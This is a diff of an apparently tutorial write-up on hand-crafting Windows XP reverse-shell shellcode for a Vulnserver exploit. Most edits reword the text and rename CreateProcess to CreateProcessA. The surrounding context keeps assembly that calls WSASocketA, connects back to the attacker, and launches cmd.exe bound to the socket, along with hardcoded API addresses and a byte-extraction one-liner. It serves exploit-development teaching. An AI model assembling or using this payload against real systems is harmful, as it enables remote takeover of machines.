@@ -44,7 +44,7 @@ The order of execution of a fully crafted shellcode is the following:
 . Call `socket()` or `WSASocketA()` to bind a new socket handle.
 . Call `connect()` or `WSAConnect()` to establish a connection to the
 attacker machine.
-. Call `CreateProcess()` which calls `cmd.exe` and where the `STDIN`, `STDOUT`,
+. Call `CreateProcessA()` which calls `cmd.exe` and where the `STDIN`, `STDOUT`,
 and `STDERR` are redirected to the previously generated socket handle.
 
 However, if we are exploiting a TCP/IP server like `Vulnserver`, chances are
@@ -131,7 +131,8 @@ WSASocketA is located at 0x71ab8b6a in ws2_32
 ----
 
 Ok, with all the required information, we can proceed to write some Assembler.
-The required call to `WSASocketA` is written like this:
+We need to get a socket handle that can be used by a TCP connection.
+With that in mind, we can write the call to `WSASocketA()`:
 
 .WSASocketA() in ASM
 [source,asm]
@@ -152,11 +153,13 @@ call ebx                ; call WSASocketA()
 xchg eax,esi            ; Save the returned socket handle on ESI
 ----
 
+Nice, we stored the socket handle in the ESI register that we will
+need in the forthcoming functions.
 
 === connect()
 
 The `connect()` call will actually create the connection back to the
-attacker, using the socket handle created by `WSASocketA`
+attacker, using the socket handle created by `WSASocketA` that we stored en ESI:
 
 .connect() signature
 [source,cpp]
@@ -188,7 +191,8 @@ arwin - win32 address resolution program - by steve hanna - v.01
 connect is located at 0x71ab4a07 in ws2_32
 ----
 
-Now, the connect() function call in assembler will be written like:
+Now that we know the structure of the `connect()` function call, and the
+address of the function, we can write it in Assembler:
 
 .connect() in assembler
 [source,asm]
@@ -240,13 +244,14 @@ mov ebx,0x71ab4a07      ; Address of connect() on WinXPSP3
 call ebx                ; Call connect()
 ----
 
-=== CreateProcess()
+=== CreateProcessA()
 
-Now comes the final function `CreateProcess` which is responsible for creating
-an instance of the `cmd.exe` command and divert the file descriptors to
-our newly created connection, to make the shell interactive for the attacker.
+Now comes the final function `CreateProcessA()` which is responsible for
+creating an instance of the `cmd.exe` command. We also need to point the
+STDIN, STDOUT and STDERR descriptors to our socket handle to make the
+resultant shell interactive for us.
 
-.CreateProcess() signature
+.CreateProcessA() signature
 [source,cpp]
 ----
 BOOL CreateProcessA(
@@ -302,9 +307,9 @@ typedef struct _PROCESS_INFORMATION {
 } PROCESS_INFORMATION, *PPROCESS_INFORMATION, *LPPROCESS_INFORMATION;
 ----
 
-Get the address of `CreateProcess()`:
+Get the address of `CreateProcessA()`:
 
-.arwin finding CreateProcess()
+.arwin finding CreateProcessA()
 [source,bash]
 ----
 C:\Documents and Settings\Administrator>arwin kernel32 CreateProcessA
@@ -312,9 +317,9 @@ arwin - win32 address resolution program - by steve hanna - v.01
 CreateProcessA is located at 0x7c80236b in kernel32
 ----
 
-In assembler, the call to `CreateProcess` will look like this:
+In assembler, the call to `CreateProcessA()` will look like this:
 
-.CreateProcess() in assembler
+.CreateProcessA() in assembler
 [source,asm]
 ----
 mov ebx,0x646d6341      ; Move 'cmda' to EBX. The trailing 'a' is to avoid
@@ -370,8 +375,8 @@ push ebx                ; lpThreadAttributes
 push ebx                ; lpProcessAttributes
 push ecx                ; lpCommandLine = Pointer to 'cmd\x00'
 push ebx                ; lpApplicationName
-mov ebx,0x7c80236b      ; Address of CreateProcess()
-call ebx                ; Call CreateProcess() on WinXPSP3
+mov ebx,0x7c80236b      ; Address of CreateProcessA()
+call ebx                ; Call CreateProcessA() on WinXPSP3
 ----
 
 == Putting it all together
@@ -418,7 +423,7 @@ push esi                ; Push saved socket handler ('s' parameter)
 mov ebx,0x71ab4a07      ; Address of connect() on WinXPSP3
 call ebx                ; Call connect()
 
-; CreateProcess()
+; CreateProcessA()
 
 mov ebx,0x646d6341      ; Move 'cmda' to EBX. The trailing 'a' is to avoid
                         ; injecting null bytes.
@@ -473,7 +478,7 @@ push ebx                ; lpThreadAttributes
 push ebx                ; lpProcessAttributes
 push ecx                ; lpCommandLine = Pointer to 'cmd\x00'
 push ebx                ; lpApplicationName
-mov ebx,0x7c80236b      ; Call CreateProcess()
+mov ebx,0x7c80236b      ; Call CreateProcessA()
 call ebx
 ----
 
@@ -500,11 +505,11 @@ $ for i in $(objdump -d shellcode.o -M intel |grep "^ " |cut -f2); do echo -n '\
 ----
 
 As you can see, the resulting shellcode is only 126 bytes long and will
-nicely fits on our buffer without the need to use egghunters.
+nicely fit on our buffer without the need to use egghunters.
 
 == Update our exploit
 
-Now that we have our custom shellcode, we can update our
+Now that we have our manually created shellcode, we can update our
 link:../vulnserver-gter/[previous exploit].
 
 We will remove the egghunter and the previous shellcode and will include our
